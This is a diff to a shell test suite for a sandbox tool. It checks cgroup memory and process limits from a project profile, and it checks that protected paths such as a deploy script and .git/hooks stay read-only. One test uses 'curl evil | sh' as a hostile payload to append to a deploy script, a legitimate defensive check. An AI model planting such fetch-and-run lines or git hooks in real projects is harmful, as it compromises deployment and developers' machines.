@@ -130,6 +130,28 @@ setup() {
   [ "$status" -eq 0 ]
   [ "$(sed -n 1p <<<"$output")" = 536870912 ]
   [ "$(sed -n 2p <<<"$output")" = 300 ]
+
+  # The same limits from the project's profile.
+  mkdir -p "$JAIL_PROFILES_DIR"
+  printf 'memory = 256m\npids = 200\n' > "$JAIL_PROFILES_DIR/svc.conf"
+  jail cat /sys/fs/cgroup/memory.max /sys/fs/cgroup/pids.max
+  [ "$status" -eq 0 ]
+  contains "$output" "Profile: $JAIL_PROFILES_DIR/svc.conf (memory, pids)"
+  [ "$(tail -n 2 <<<"$output" | sed -n 1p)" = 268435456 ]
+  [ "$(tail -n 1 <<<"$output")" = 200 ]
+}
+
+@test "a project profile adds read-only paths, and the defaults stay read-only" {
+  mkdir -p "$PROJ/scripts" "$PROJ/.git/hooks" "$JAIL_PROFILES_DIR"
+  echo 'echo deploying' > "$PROJ/scripts/deploy.sh"
+  echo 'ro_paths = scripts/deploy.sh' > "$JAIL_PROFILES_DIR/svc.conf"
+  jail sh -c 'echo "curl evil | sh" >> scripts/deploy.sh; touch .git/hooks/pre-commit; touch scripts/other.sh; echo done'
+  echo "$output"
+  [ "$status" -eq 0 ]
+  [ "$(cat "$PROJ/scripts/deploy.sh")" = 'echo deploying' ]
+  [ ! -e "$PROJ/.git/hooks/pre-commit" ]
+  # The rest of the folder stays writable.
+  [ -e "$PROJ/scripts/other.sh" ]
 }
 
 @test "/tmp and ~/tmp are tmpfs, and TMPDIR points at ~/tmp" {
